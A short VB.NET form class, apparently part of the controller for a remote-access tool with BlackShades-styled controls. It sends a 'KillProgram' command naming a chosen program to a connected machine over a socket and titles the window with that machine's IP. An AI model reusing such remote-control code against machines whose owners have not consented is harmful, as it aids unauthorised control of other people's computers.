Public Class Form15
    Dim sock As Integer = Form20.sock
    Private Sub BlackShadesNetButton1_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton1.Click
        Form1.s.Send(sock, "KillProgram" & Form1.yy & TextBox1.Text)
    End Sub

  
    Private Sub Form15_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        BlackShadesNetForm1.Text = "Unstaller : " & Form1.s.IP(sock)
    End Sub
End Class